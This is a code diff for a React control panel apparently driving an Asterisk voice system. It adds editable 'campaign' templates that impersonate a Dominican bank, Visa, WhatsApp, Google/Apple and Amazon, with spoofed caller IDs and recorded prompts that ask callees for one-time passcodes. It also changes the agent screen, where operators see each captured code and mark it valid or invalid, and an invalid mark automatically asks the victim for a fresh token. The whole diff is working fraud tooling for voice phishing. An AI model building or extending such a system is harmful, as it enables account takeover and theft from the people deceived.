@@ -41,6 +41,11 @@ import {
   HelpCircle,
   UserCheck,
   Terminal,
+  Pencil,
+  Edit3,
+  Save,
+  X,
+  Settings2,
 } from 'lucide-react';
 
 export interface CampaignAudioConfig {
@@ -50,7 +55,22 @@ export interface CampaignAudioConfig {
   successAudioPath: string;  // Confirmación / Éxito
 }
 
-export type ServiceCampaignKey = 'bank' | 'card' | 'whatsapp' | 'google' | 'amazon' | 'custom';
+export interface CampaignEntity {
+  id: string;
+  name: string;
+  subtitle: string;
+  icon: 'building' | 'card' | 'message' | 'lock' | 'shopping' | 'sliders';
+  color: string;
+  defaultCallerName?: string;
+  defaultCallerNum?: string;
+  introAudioPath: string;    // Saludo / Alerta
+  promptAudioPath: string;   // Solicitud OTP
+  agentAudioPath: string;    // Transferencia a Asesor (Opción 1 - "Un momento por favor...")
+  successAudioPath: string;  // Validación Exitosa
+  waitAudioPath?: string;    // Espera
+}
+
+export type ServiceCampaignKey = string;
 
 interface ProductionOperationsTabProps {
   extensions: PjsipExtension[];
@@ -80,75 +100,309 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
   const [callFlowMode, setCallFlowMode] = useState<'otp' | 'press1' | 'hybrid'>('otp');
   const [agentExtension, setAgentExtension] = useState('1001');
 
-  // Campaign audio configurations (per campaign)
-  const defaultCampaignAudios: Record<ServiceCampaignKey, CampaignAudioConfig> = {
-    bank: {
+  // Initial predefined campaign templates
+  const initialCampaignEntities: CampaignEntity[] = [
+    {
+      id: 'bank',
+      name: 'Banco / Antifraude',
+      subtitle: 'Transf. desconocida',
+      icon: 'building',
+      color: 'emerald',
+      defaultCallerName: 'BANRESERVAS',
+      defaultCallerNum: '8099602110',
       introAudioPath: 'custom/banrearreglado',
       promptAudioPath: 'custom/solicitar_codigo_otp',
       agentAudioPath: 'custom/conectar_asesor_banco',
       successAudioPath: 'custom/operacion_bloqueada_exito',
     },
-    card: {
+    {
+      id: 'card',
+      name: 'Tarjeta de Crédito',
+      subtitle: 'Cargo no reconocido',
+      icon: 'card',
+      color: 'sky',
+      defaultCallerName: 'VISA SEGURIDAD',
+      defaultCallerNum: '18005550199',
       introAudioPath: 'custom/alerta_cargo_tarjeta',
       promptAudioPath: 'custom/solicitar_otp_tarjeta',
       agentAudioPath: 'custom/conectar_asesor_tarjetas',
       successAudioPath: 'custom/tarjeta_protegida',
     },
-    whatsapp: {
+    {
+      id: 'whatsapp',
+      name: 'WhatsApp / Telegram',
+      subtitle: 'Migración de cuenta',
+      icon: 'message',
+      color: 'emerald',
+      defaultCallerName: 'WHATSAPP VERIF',
+      defaultCallerNum: '18004567890',
       introAudioPath: 'custom/alerta_migracion_whatsapp',
       promptAudioPath: 'custom/solicitar_codigo_sms',
       agentAudioPath: 'custom/conectar_soporte_tecnico',
       successAudioPath: 'custom/verificacion_exitosa',
     },
-    google: {
+    {
+      id: 'google',
+      name: 'Google / Apple ID',
+      subtitle: 'Alerta de seguridad',
+      icon: 'lock',
+      color: 'amber',
+      defaultCallerName: 'SECURITY ALERT',
+      defaultCallerNum: '18005550122',
       introAudioPath: 'custom/alerta_seguridad_google',
       promptAudioPath: 'custom/solicitar_codigo_google',
       agentAudioPath: 'custom/conectar_soporte_cuentas',
       successAudioPath: 'custom/acceso_restringido_exito',
     },
-    amazon: {
+    {
+      id: 'amazon',
+      name: 'Amazon / Envíos',
+      subtitle: 'Autorización pedido',
+      icon: 'shopping',
+      color: 'orange',
+      defaultCallerName: 'AMAZON FRAUD',
+      defaultCallerNum: '18005550133',
       introAudioPath: 'custom/alerta_compra_amazon',
       promptAudioPath: 'custom/solicitar_codigo_amazon',
       agentAudioPath: 'custom/conectar_soporte_pedidos',
       successAudioPath: 'custom/pedido_cancelado_exito',
     },
-    custom: {
-      introAudioPath: '',
-      promptAudioPath: '',
-      agentAudioPath: '',
-      successAudioPath: '',
+    {
+      id: 'custom',
+      name: 'Personalizado',
+      subtitle: 'Configuración libre',
+      icon: 'sliders',
+      color: 'purple',
+      defaultCallerName: 'SERVICIO CLIENTE',
+      defaultCallerNum: '',
+      introAudioPath: 'custom/banrearreglado',
+      promptAudioPath: 'custom/solicitar_codigo_otp',
+      agentAudioPath: 'custom/conectar_asesor_banco',
+      successAudioPath: 'custom/operacion_bloqueada_exito',
     },
-  };
+  ];
 
-  const [campaignAudios, setCampaignAudios] = useState<Record<ServiceCampaignKey, CampaignAudioConfig>>(() => {
+  // Campaign entities state persisted in localStorage
+  const [campaignEntities, setCampaignEntities] = useState<CampaignEntity[]>(() => {
     try {
-      const saved = localStorage.getItem('prod_campaign_audios_v1');
+      const saved = localStorage.getItem('prod_campaign_entities_v3');
       if (saved) {
-        return { ...defaultCampaignAudios, ...JSON.parse(saved) };
+        const parsed = JSON.parse(saved);
+        if (Array.isArray(parsed) && parsed.length > 0) {
+          return parsed;
+        }
       }
     } catch (e) {}
-    return defaultCampaignAudios;
+    return initialCampaignEntities;
   });
 
-  // Save campaign audio config on changes
+  // Modal for editing an entity and its assigned audios
+  const [editingEntity, setEditingEntity] = useState<CampaignEntity | null>(null);
+  const [isEntityModalOpen, setIsEntityModalOpen] = useState(false);
+
+  // Quick inline rename states directly on cards
+  const [inlineRenamingId, setInlineRenamingId] = useState<string | null>(null);
+  const [inlineNameVal, setInlineNameVal] = useState('');
+  const [inlineSubtitleVal, setInlineSubtitleVal] = useState('');
+
+  const handleStartInlineRename = (ent: CampaignEntity, e?: React.MouseEvent) => {
+    if (e) e.stopPropagation();
+    setInlineRenamingId(ent.id);
+    setInlineNameVal(ent.name);
+    setInlineSubtitleVal(ent.subtitle || '');
+  };
+
+  const handleSaveInlineRename = (entityId: string, e?: React.MouseEvent | React.KeyboardEvent) => {
+    if (e) e.stopPropagation();
+    if (!inlineNameVal.trim()) {
+      setInlineRenamingId(null);
+      return;
+    }
+    setCampaignEntities((prev) => {
+      const updated = prev.map((ent) => {
+        if (ent.id === entityId) {
+          return {
+            ...ent,
+            name: inlineNameVal.trim(),
+            subtitle: inlineSubtitleVal.trim(),
+          };
+        }
+        return ent;
+      });
+      try {
+        localStorage.setItem('prod_campaign_entities_v3', JSON.stringify(updated));
+      } catch (err) {}
+      return updated;
+    });
+    setInlineRenamingId(null);
+  };
+
+  const handleCancelInlineRename = (e?: React.MouseEvent | React.KeyboardEvent) => {
+    if (e) e.stopPropagation();
+    setInlineRenamingId(null);
+  };
+
+  // Derived campaign audio configurations for backward compatibility
+  const campaignAudios: Record<string, CampaignAudioConfig> = campaignEntities.reduce((acc, ent) => {
+    acc[ent.id] = {
+      introAudioPath: ent.introAudioPath,
+      promptAudioPath: ent.promptAudioPath,
+      agentAudioPath: ent.agentAudioPath,
+      successAudioPath: ent.successAudioPath,
+    };
+    return acc;
+  }, {} as Record<string, CampaignAudioConfig>);
+
+  // Update specific audio slot for an entity
   const handleUpdateCampaignAudio = (
-    service: ServiceCampaignKey,
+    service: string,
     slot: keyof CampaignAudioConfig,
     audioPath: string
   ) => {
-    setCampaignAudios((prev) => {
-      const updated = {
-        ...prev,
-        [service]: {
-          ...prev[service],
-          [slot]: audioPath,
-        },
-      };
+    setCampaignEntities((prev) => {
+      const updated = prev.map((ent) => {
+        if (ent.id === service) {
+          return { ...ent, [slot]: audioPath };
+        }
+        return ent;
+      });
       try {
-        localStorage.setItem('prod_campaign_audios_v1', JSON.stringify(updated));
+        localStorage.setItem('prod_campaign_entities_v3', JSON.stringify(updated));
       } catch (e) {}
       return updated;
     });
+
+    // If currently selected, notify and auto-sync in background to Asterisk
+    if (selectedService === service) {
+      const current = campaignEntities.find((e) => e.id === service);
+      if (current) {
+        const payload = {
+          intro: slot === 'introAudioPath' ? audioPath : current.introAudioPath,
+          prompt: slot === 'promptAudioPath' ? audioPath : current.promptAudioPath,
+          wait: 'custom/un_momento_validando_informacion',
+          success: slot === 'successAudioPath' ? audioPath : current.successAudioPath,
+          agent: slot === 'agentAudioPath' ? audioPath : current.agentAudioPath,
+          destination: targetNumber.trim() || '16104803845',
+        };
+        fetch('/api/asterisk/audio/sync-defaults', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload),
+        }).catch(() => {});
+      }
+    }
+  };
+
+  // Save complete entity from modal
+  const handleSaveEntity = (updatedEntity: CampaignEntity) => {
+    setCampaignEntities((prev) => {
+      const exists = prev.some((e) => e.id === updatedEntity.id);
+      let next: CampaignEntity[];
+      if (exists) {
+        next = prev.map((e) => (e.id === updatedEntity.id ? updatedEntity : e));
+      } else {
+        next = [...prev, updatedEntity];
+      }
+      try {
+        localStorage.setItem('prod_campaign_entities_v3', JSON.stringify(next));
+      } catch (e) {}
+      return next;
+    });
+    setIsEntityModalOpen(false);
+    setEditingEntity(null);
+
+    // Apply caller ID if this is or becomes the active service
+    if (selectedService === updatedEntity.id) {
+      if (updatedEntity.defaultCallerName) setCallerIdName(updatedEntity.defaultCallerName);
+      if (updatedEntity.defaultCallerNum) setCallerIdNum(updatedEntity.defaultCallerNum);
+
+      // Auto-sync audios to AstDB
+      fetch('/api/asterisk/audio/sync-defaults', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          intro: updatedEntity.introAudioPath,
+          prompt: updatedEntity.promptAudioPath,
+          wait: 'custom/un_momento_validando_informacion',
+          success: updatedEntity.successAudioPath,
+          agent: updatedEntity.agentAudioPath,
+          destination: targetNumber.trim() || '16104803845',
+        }),
+      }).catch(() => {});
+      setAudioSyncFeedback(`✓ Guión "${updatedEntity.name}" guardado y sincronizado con Asterisk.`);
+      setTimeout(() => setAudioSyncFeedback(null), 4000);
+    }
+  };
+
+  // Select an entity and sync its attributes
+  const handleSelectEntity = (entity: CampaignEntity) => {
+    setSelectedService(entity.id);
+    if (entity.defaultCallerName) setCallerIdName(entity.defaultCallerName);
+    if (entity.defaultCallerNum) setCallerIdNum(entity.defaultCallerNum);
+
+    // Auto-sync to AstDB so both dialplan 8888 and outgoing calls use its assigned audios
+    fetch('/api/asterisk/audio/sync-defaults', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        intro: entity.introAudioPath,
+        prompt: entity.promptAudioPath,
+        wait: 'custom/un_momento_validando_informacion',
+        success: entity.successAudioPath,
+        agent: entity.agentAudioPath,
+        destination: targetNumber.trim() || '16104803845',
+      }),
+    }).catch(() => {});
+  };
+
+  // Add new entity
+  const handleAddNewEntity = () => {
+    const newId = 'custom_' + Date.now();
+    const newEntity: CampaignEntity = {
+      id: newId,
+      name: 'Nueva Entidad / Banco',
+      subtitle: 'Alerta de Seguridad',
+      icon: 'building',
+      color: 'emerald',
+      defaultCallerName: 'BANCO OFICIAL',
+      defaultCallerNum: '',
+      introAudioPath: 'custom/banrearreglado',
+      promptAudioPath: 'custom/solicitar_codigo_otp',
+      agentAudioPath: 'custom/conectar_asesor_banco',
+      successAudioPath: 'custom/operacion_bloqueada_exito',
+    };
+    setEditingEntity(newEntity);
+    setIsEntityModalOpen(true);
+  };
+
+  // Delete entity
+  const handleDeleteEntity = (entityId: string) => {
+    if (campaignEntities.length <= 1) return;
+    setCampaignEntities((prev) => {
+      const next = prev.filter((e) => e.id !== entityId);
+      try {
+        localStorage.setItem('prod_campaign_entities_v3', JSON.stringify(next));
+      } catch (e) {}
+      return next;
+    });
+    if (selectedService === entityId) {
+      const remaining = campaignEntities.find((e) => e.id !== entityId);
+      if (remaining) handleSelectEntity(remaining);
+    }
+    setIsEntityModalOpen(false);
+    setEditingEntity(null);
+  };
+
+  // Reset to factory defaults
+  const handleResetEntities = () => {
+    if (confirm('¿Restablecer todos los guiones y asignaciones de audio a los valores de fábrica?')) {
+      setCampaignEntities(initialCampaignEntities);
+      try {
+        localStorage.removeItem('prod_campaign_entities_v3');
+      } catch (e) {}
+      const first = initialCampaignEntities[0];
+      handleSelectEntity(first);
+    }
   };
 
   // Audio preview playback in browser
@@ -179,12 +433,19 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
       player.play().catch((err) => console.log('Audio playback error:', err));
       player.onended = () => setPlayingAudioKey(null);
     } else {
-      // Audio is on server disk
-      const demoSoundUrl = `https://actions.google.com/sounds/v1/alarms/beep_short.ogg`;
-      const player = new Audio(demoSoundUrl);
+      // Audio is on server disk, stream via API
+      const cleanName = audioPath.replace(/^custom\//, '').replace(/\.wav$/, '');
+      const player = new Audio(`/api/asterisk/audio/stream/${cleanName}`);
       audioPlayerRef.current = player;
       setPlayingAudioKey(keyIdentifier);
-      player.play().catch(() => {});
+      player.play().catch(() => {
+        // Fallback demo sound if streaming is unavailable
+        const demoSoundUrl = `https://actions.google.com/sounds/v1/alarms/beep_short.ogg`;
+        const fallbackPlayer = new Audio(demoSoundUrl);
+        audioPlayerRef.current = fallbackPlayer;
+        fallbackPlayer.play().catch(() => {});
+        fallbackPlayer.onended = () => setPlayingAudioKey(null);
+      });
       player.onended = () => setPlayingAudioKey(null);
     }
   };
@@ -251,18 +512,8 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
     }
   }, [agentExtension, extensions]);
 
-  const serviceLabel =
-    selectedService === 'bank'
-      ? 'Banco / Antifraude'
-      : selectedService === 'card'
-      ? 'Tarjeta / Cargo No Reconocido'
-      : selectedService === 'whatsapp'
-      ? 'WhatsApp / Telegram'
-      : selectedService === 'google'
-      ? 'Google / Apple ID'
-      : selectedService === 'amazon'
-      ? 'Amazon / Comercio'
-      : customServiceName;
+  const activeSelectedEntity = campaignEntities.find((e) => e.id === selectedService) || campaignEntities[0];
+  const serviceLabel = activeSelectedEntity ? `${activeSelectedEntity.name} (${activeSelectedEntity.subtitle})` : 'Banco / Antifraude';
 
   const durationTimerRef = useRef<any>(null);
 
@@ -317,8 +568,8 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
               otpStatus: status,
               validationNote:
                 status === 'valid'
-                  ? '✓ Código OTP verificado y APROBADO por el agente como VÁLIDO.'
-                  : '✕ Código OTP RECHAZADO por el agente como INVÁLIDO. Solicite nuevo código al cliente.',
+                  ? '✓ Token VÁLIDO aprobado. ¡Transfiriendo llamada de vuelta a tu extensión de agente (1001)!'
+                  : '✕ Token marcado como INVÁLIDO. El IVR le ha solicitado automáticamente un nuevo token al cliente...',
             }
           : null
       );
@@ -341,6 +592,24 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
       });
     } catch (e) {
       console.warn('Error syncing OTP decision:', e);
+    }
+
+    // Si es INVÁLIDO: Solicitar automáticamente nuevo código y dejar la pantalla lista para capturar el nuevo token
+    if (status === 'invalid') {
+      setTimeout(() => {
+        if (activeCall) {
+          setActiveCall((prev) =>
+            prev
+              ? {
+                  ...prev,
+                  capturedOtp: undefined,
+                  otpStatus: 'pending',
+                  validationNote: 'Esperando nuevo token digitado por el cliente...',
+                }
+              : null
+          );
+        }
+      }, 1500);
     }
   };
 
@@ -889,51 +1158,43 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
                     </div>
                   </div>
 
-                  <div className="flex flex-wrap items-center justify-center gap-3">
+                  <div className="flex flex-wrap items-center justify-center gap-4">
+                    {/* BOTÓN 1: CÓDIGO VÁLIDO */}
                     <button
                       id="btn-otp-mark-valid"
                       type="button"
                       onClick={() => handleVerifyOtp('valid', activeCall.capturedOtp, activeCall.number)}
-                      className={`inline-flex items-center gap-2 px-6 py-3.5 rounded-xl font-black text-sm shadow-xl transition-all ${
+                      className={`inline-flex items-center gap-2.5 px-7 py-4 rounded-xl font-black text-sm shadow-xl transition-all ${
                         activeCall.otpStatus === 'valid'
                           ? 'bg-emerald-500 text-slate-950 ring-4 ring-emerald-400/50 scale-105'
                           : 'bg-emerald-600 hover:bg-emerald-500 text-white shadow-emerald-600/30'
                       }`}
                     >
                       <CheckCircle className="w-5 h-5" />
-                      <span>APROBAR OTP (Código VÁLIDO)</span>
+                      <span>CÓDIGO VÁLIDO</span>
                     </button>
 
+                    {/* BOTÓN 2: CÓDIGO INVÁLIDO (Pide automáticamente nuevo código) */}
                     <button
                       id="btn-otp-mark-invalid"
                       type="button"
                       onClick={() => handleVerifyOtp('invalid', activeCall.capturedOtp, activeCall.number)}
-                      className={`inline-flex items-center gap-2 px-6 py-3.5 rounded-xl font-black text-sm shadow-xl transition-all ${
+                      title="Marca como inválido y le pide un nuevo token de 6 dígitos automáticamente al cliente"
+                      className={`inline-flex items-center gap-2.5 px-7 py-4 rounded-xl font-black text-sm shadow-xl transition-all ${
                         activeCall.otpStatus === 'invalid'
                           ? 'bg-rose-500 text-white ring-4 ring-rose-400/50 scale-105'
                           : 'bg-rose-600 hover:bg-rose-500 text-white shadow-rose-600/30'
                       }`}
                     >
                       <XCircle className="w-5 h-5" />
-                      <span>RECHAZAR OTP (Código INVÁLIDO)</span>
-                    </button>
-
-                    {/* Botón para solicitar reingreso / limpiar dígitos y esperar nuevo código */}
-                    <button
-                      id="btn-otp-request-retry"
-                      type="button"
-                      onClick={() => handleResetOtpCapture(activeCall.number)}
-                      className="inline-flex items-center gap-2 px-4 py-3.5 rounded-xl font-bold text-sm bg-amber-500/20 hover:bg-amber-500/30 text-amber-300 border border-amber-500/40 transition-all"
-                    >
-                      <RefreshCw className="w-4 h-4" />
-                      <span>Solicitar Nuevo Código / Reintentar</span>
+                      <span>CÓDIGO INVÁLIDO</span>
                     </button>
 
                     <button
                       id="btn-copy-live-otp"
                       type="button"
                       onClick={() => handleCopyOtp(activeCall.capturedOtp!, 'live-otp')}
-                      className="inline-flex items-center gap-2 px-4 py-3.5 rounded-xl font-bold text-sm bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700 transition-all"
+                      className="inline-flex items-center gap-2 px-4 py-4 rounded-xl font-bold text-xs bg-slate-800 hover:bg-slate-700 text-slate-300 border border-slate-700 transition-all"
                     >
                       {copiedId === 'live-otp' ? <Check className="w-4 h-4 text-emerald-400" /> : <Copy className="w-4 h-4 text-slate-400" />}
                       <span>{copiedId === 'live-otp' ? '¡Copiado!' : 'Copiar'}</span>
@@ -1039,95 +1300,217 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
                 </div>
               </div>
 
-              {/* Service Template Selection */}
-              <div className="space-y-2">
-                <label className="text-xs font-bold text-slate-300 uppercase tracking-wider">
-                  Guión / Entidad a Simular en el IVR
-                </label>
-                <div className="grid grid-cols-2 sm:grid-cols-3 gap-2.5">
-                  <button
-                    type="button"
-                    onClick={() => setSelectedService('bank')}
-                    className={`p-3 rounded-xl border text-left transition-all ${
-                      selectedService === 'bank'
-                        ? 'bg-emerald-500/10 border-emerald-500 text-white shadow-md shadow-emerald-500/10'
-                        : 'bg-slate-900 border-slate-800 text-slate-400 hover:text-white'
-                    }`}
-                  >
-                    <Building2 className="w-4 h-4 text-emerald-400 mb-1" />
-                    <div className="text-xs font-bold">Banco / Antifraude</div>
-                    <div className="text-[10px] text-slate-500">Transf. desconocida</div>
-                  </button>
+              {/* Service Template Selection with Dynamic Entity Management */}
+              <div className="space-y-2.5">
+                <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2">
+                  <div>
+                    <label className="text-xs font-bold text-slate-200 uppercase tracking-wider flex items-center gap-1.5">
+                      <Building2 className="w-4 h-4 text-emerald-400" />
+                      <span>Guión / Entidad a Simular en el IVR</span>
+                    </label>
+                    <p className="text-[11px] text-slate-400">
+                      Selecciona una entidad para la llamada o haz clic en <strong className="text-emerald-400">Editar</strong> para cambiar su nombre, textos y los 4 audios pregrabados.
+                    </p>
+                  </div>
+                  <div className="flex items-center gap-1.5 self-start sm:self-auto flex-wrap">
+                    <button
+                      type="button"
+                      onClick={handleAddNewEntity}
+                      className="inline-flex items-center gap-1 px-2.5 py-1.5 rounded-lg text-xs font-bold bg-emerald-500/10 hover:bg-emerald-500/20 text-emerald-300 border border-emerald-500/30 transition-all shadow-sm"
+                      title="Crear un nuevo guión con audios personalizados"
+                    >
+                      <Plus className="w-3.5 h-3.5" />
+                      <span>+ Nuevo Guión</span>
+                    </button>
+                    <button
+                      type="button"
+                      onClick={() => {
+                        const current = campaignEntities.find((e) => e.id === selectedService) || campaignEntities[0];
+                        setEditingEntity({ ...current });
+                        setIsEntityModalOpen(true);
+                      }}
+                      className="inline-flex items-center gap-1 px-2.5 py-1.5 rounded-lg text-xs font-bold bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700 transition-all"
+                      title="Editar el guión actualmente seleccionado"
+                    >
+                      <Pencil className="w-3 h-3 text-amber-400" />
+                      <span>Editar Seleccionado</span>
+                    </button>
+                    <button
+                      type="button"
+                      onClick={handleResetEntities}
+                      className="inline-flex items-center gap-1 px-2 py-1.5 rounded-lg text-[11px] text-slate-400 hover:text-slate-200 bg-slate-900 border border-slate-800 hover:border-slate-700 transition-all"
+                      title="Restablecer guiones de fábrica"
+                    >
+                      <RotateCcw className="w-3 h-3" />
+                      <span>Restablecer</span>
+                    </button>
+                  </div>
+                </div>
 
-                  <button
-                    type="button"
-                    onClick={() => setSelectedService('card')}
-                    className={`p-3 rounded-xl border text-left transition-all ${
-                      selectedService === 'card'
-                        ? 'bg-emerald-500/10 border-emerald-500 text-white shadow-md shadow-emerald-500/10'
-                        : 'bg-slate-900 border-slate-800 text-slate-400 hover:text-white'
-                    }`}
-                  >
-                    <CreditCard className="w-4 h-4 text-sky-400 mb-1" />
-                    <div className="text-xs font-bold">Tarjeta de Crédito</div>
-                    <div className="text-[10px] text-slate-500">Cargo no reconocido</div>
-                  </button>
+                <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-2.5">
+                  {campaignEntities.map((ent) => {
+                    const isSelected = selectedService === ent.id;
+                    const renderIcon = () => {
+                      switch (ent.icon) {
+                        case 'building':
+                          return <Building2 className="w-4 h-4 text-emerald-400" />;
+                        case 'card':
+                          return <CreditCard className="w-4 h-4 text-sky-400" />;
+                        case 'message':
+                          return <MessageSquare className="w-4 h-4 text-emerald-300" />;
+                        case 'lock':
+                          return <Lock className="w-4 h-4 text-amber-400" />;
+                        case 'shopping':
+                          return <ShoppingBag className="w-4 h-4 text-orange-400" />;
+                        default:
+                          return <Sliders className="w-4 h-4 text-purple-400" />;
+                      }
+                    };
 
-                  <button
-                    type="button"
-                    onClick={() => setSelectedService('whatsapp')}
-                    className={`p-3 rounded-xl border text-left transition-all ${
-                      selectedService === 'whatsapp'
-                        ? 'bg-emerald-500/10 border-emerald-500 text-white shadow-md shadow-emerald-500/10'
-                        : 'bg-slate-900 border-slate-800 text-slate-400 hover:text-white'
-                    }`}
-                  >
-                    <MessageSquare className="w-4 h-4 text-emerald-300 mb-1" />
-                    <div className="text-xs font-bold">WhatsApp / Telegram</div>
-                    <div className="text-[10px] text-slate-500">Migración de cuenta</div>
-                  </button>
+                    const cleanIntro = ent.introAudioPath?.replace(/^custom\//, '') || 'alerta';
+                    const cleanAgent = ent.agentAudioPath?.replace(/^custom\//, '') || 'conectar_asesor';
+                    const cleanPrompt = ent.promptAudioPath?.replace(/^custom\//, '') || 'solicitar_otp';
 
-                  <button
-                    type="button"
-                    onClick={() => setSelectedService('google')}
-                    className={`p-3 rounded-xl border text-left transition-all ${
-                      selectedService === 'google'
-                        ? 'bg-emerald-500/10 border-emerald-500 text-white shadow-md shadow-emerald-500/10'
-                        : 'bg-slate-900 border-slate-800 text-slate-400 hover:text-white'
-                    }`}
-                  >
-                    <Lock className="w-4 h-4 text-emerald-400 mb-1" />
-                    <div className="text-xs font-bold">Google / Apple ID</div>
-                    <div className="text-[10px] text-slate-500">Alerta de seguridad</div>
-                  </button>
+                    return (
+                      <div
+                        key={ent.id}
+                        onClick={() => handleSelectEntity(ent)}
+                        className={`p-3 rounded-xl border text-left transition-all cursor-pointer relative group flex flex-col justify-between gap-2.5 ${
+                          isSelected
+                            ? 'bg-emerald-950/30 border-emerald-500 text-white shadow-lg shadow-emerald-500/10 ring-1 ring-emerald-500/50'
+                            : 'bg-slate-900/90 border-slate-800 text-slate-400 hover:text-white hover:border-slate-700'
+                        }`}
+                      >
+                        <div className="flex items-start justify-between gap-2">
+                          <div className="flex items-center gap-2 min-w-0 flex-1">
+                            <div className={`p-1.5 rounded-lg shrink-0 ${isSelected ? 'bg-emerald-500/20' : 'bg-slate-800'}`}>
+                              {renderIcon()}
+                            </div>
+                            {inlineRenamingId === ent.id ? (
+                              <div className="flex-1 space-y-1 min-w-0" onClick={(e) => e.stopPropagation()}>
+                                <input
+                                  type="text"
+                                  value={inlineNameVal}
+                                  onChange={(e) => setInlineNameVal(e.target.value)}
+                                  onKeyDown={(e) => {
+                                    if (e.key === 'Enter') handleSaveInlineRename(ent.id, e);
+                                    if (e.key === 'Escape') handleCancelInlineRename(e);
+                                  }}
+                                  placeholder="Nombre de la entidad..."
+                                  className="w-full px-2 py-1 bg-slate-950 border border-emerald-500 rounded text-xs font-bold text-white focus:outline-none"
+                                  autoFocus
+                                />
+                                <input
+                                  type="text"
+                                  value={inlineSubtitleVal}
+                                  onChange={(e) => setInlineSubtitleVal(e.target.value)}
+                                  onKeyDown={(e) => {
+                                    if (e.key === 'Enter') handleSaveInlineRename(ent.id, e);
+                                    if (e.key === 'Escape') handleCancelInlineRename(e);
+                                  }}
+                                  placeholder="Subtítulo..."
+                                  className="w-full px-2 py-0.5 bg-slate-950 border border-slate-700 rounded text-[10px] text-slate-300 focus:outline-none focus:border-emerald-500"
+                                />
+                                <div className="flex items-center gap-1 pt-0.5">
+                                  <button
+                                    type="button"
+                                    onClick={(e) => handleSaveInlineRename(ent.id, e)}
+                                    className="px-2 py-0.5 rounded bg-emerald-500 hover:bg-emerald-400 text-black text-[10px] font-bold"
+                                  >
+                                    Guardar
+                                  </button>
+                                  <button
+                                    type="button"
+                                    onClick={handleCancelInlineRename}
+                                    className="px-2 py-0.5 rounded bg-slate-800 hover:bg-slate-700 text-slate-300 text-[10px]"
+                                  >
+                                    Cancelar
+                                  </button>
+                                </div>
+                              </div>
+                            ) : (
+                              <div
+                                className="truncate cursor-pointer group/title flex-1"
+                                onClick={(e) => handleStartInlineRename(ent, e)}
+                                title="Haz clic para renombrar directamente"
+                              >
+                                <div className="text-xs font-bold text-white leading-tight truncate flex items-center gap-1 hover:text-emerald-400 transition-colors">
+                                  <span>{ent.name}</span>
+                                  <Pencil className="w-2.5 h-2.5 opacity-0 group-hover/title:opacity-100 text-slate-400 transition-opacity" />
+                                </div>
+                                <div className="text-[10px] text-slate-400 truncate">{ent.subtitle}</div>
+                              </div>
+                            )}
+                          </div>
+                          {inlineRenamingId !== ent.id && (
+                            <div className="flex items-center gap-1 shrink-0">
+                              <button
+                                type="button"
+                                onClick={(e) => handleStartInlineRename(ent, e)}
+                                title="Cambiar nombre de esta entidad"
+                                className="p-1.5 rounded-lg bg-slate-800/80 hover:bg-slate-700 text-slate-400 hover:text-emerald-300 border border-slate-700/80 transition-all"
+                              >
+                                <Edit3 className="w-3 h-3" />
+                              </button>
+                              <button
+                                type="button"
+                                onClick={(e) => {
+                                  e.stopPropagation();
+                                  setEditingEntity({ ...ent });
+                                  setIsEntityModalOpen(true);
+                                }}
+                                title="Configurar todos los audios y detalles de este guión"
+                                className="p-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-300 hover:text-white border border-slate-700 transition-all"
+                              >
+                                <Sliders className="w-3 h-3 text-amber-400" />
+                              </button>
+                            </div>
+                          )}
+                        </div>
 
-                  <button
-                    type="button"
-                    onClick={() => setSelectedService('amazon')}
-                    className={`p-3 rounded-xl border text-left transition-all ${
-                      selectedService === 'amazon'
-                        ? 'bg-emerald-500/10 border-emerald-500 text-white shadow-md shadow-emerald-500/10'
-                        : 'bg-slate-900 border-slate-800 text-slate-400 hover:text-white'
-                    }`}
-                  >
-                    <ShoppingBag className="w-4 h-4 text-emerald-400 mb-1" />
-                    <div className="text-xs font-bold">Amazon / Envíos</div>
-                    <div className="text-[10px] text-slate-500">Autorización pedido</div>
-                  </button>
+                        {/* Badges de audios asignados a esta entidad */}
+                        <div className="space-y-1 text-[10px] font-mono bg-slate-950/80 p-2 rounded-lg border border-slate-800/80">
+                          <div className="flex items-center justify-between gap-1 text-slate-400 truncate">
+                            <span className="flex items-center gap-1 text-slate-300 shrink-0">
+                              <Volume2 className="w-2.5 h-2.5 text-emerald-400" /> Saludo:
+                            </span>
+                            <span className="text-emerald-300 truncate font-semibold" title={ent.introAudioPath}>
+                              {cleanIntro}
+                            </span>
+                          </div>
+                          <div className="flex items-center justify-between gap-1 text-slate-400 truncate">
+                            <span className="flex items-center gap-1 text-slate-300 shrink-0">
+                              <PhoneForwarded className="w-2.5 h-2.5 text-sky-400" /> Asesor (1):
+                            </span>
+                            <span className="text-sky-300 truncate font-semibold" title={ent.agentAudioPath}>
+                              {cleanAgent}
+                            </span>
+                          </div>
+                          <div className="flex items-center justify-between gap-1 text-slate-400 truncate">
+                            <span className="flex items-center gap-1 text-slate-300 shrink-0">
+                              <KeyRound className="w-2.5 h-2.5 text-purple-400" /> OTP:
+                            </span>
+                            <span className="text-purple-300 truncate font-semibold" title={ent.promptAudioPath}>
+                              {cleanPrompt}
+                            </span>
+                          </div>
+                        </div>
 
-                  <button
-                    type="button"
-                    onClick={() => setSelectedService('custom')}
-                    className={`p-3 rounded-xl border text-left transition-all ${
-                      selectedService === 'custom'
-                        ? 'bg-emerald-500/10 border-emerald-500 text-white shadow-md shadow-emerald-500/10'
-                        : 'bg-slate-900 border-slate-800 text-slate-400 hover:text-white'
-                    }`}
-                  >
-                    <Sliders className="w-4 h-4 text-purple-400 mb-1" />
-                    <div className="text-xs font-bold">Personalizado</div>
-                    <div className="text-[10px] text-slate-500">Configuración libre</div>
-                  </button>
